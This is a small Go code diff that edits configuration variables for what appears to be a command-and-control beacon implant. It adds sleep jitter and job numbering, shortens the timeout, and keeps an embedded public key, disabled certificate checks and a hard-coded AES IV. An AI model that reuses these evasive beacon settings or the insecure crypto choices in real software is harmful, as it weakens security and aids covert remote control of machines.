@@ -23,14 +23,16 @@ J6JqDBl5e3S7KOhvci76QtWfR/TrNyU9tv8Wz8wqe9kovpHNpVzUNJvVUQIDAQAB
 	UseProxy                    = false
 	Proxy                       = "127.0.0.1:8080"
 	SleepTime                   = 10000 * time.Millisecond
+	SleepJitter                 = 0 // jitter percentage (0-100)
 	IgnoreSSLCertErrors         = true
-	TimeOut       time.Duration = 10 //seconds
+	TimeOut time.Duration       = 5 //seconds
 
-	IV        = []byte("abcdefghijklmnop")
+	IV                          = []byte("abcdefghijklmnop")
 	GlobalKey []byte
 	AesKey    []byte
 	HmacKey   []byte
-	Counter   = 0
+	Counter                     = 0
+	NextJobNum                  = 0
 )
 
 const (
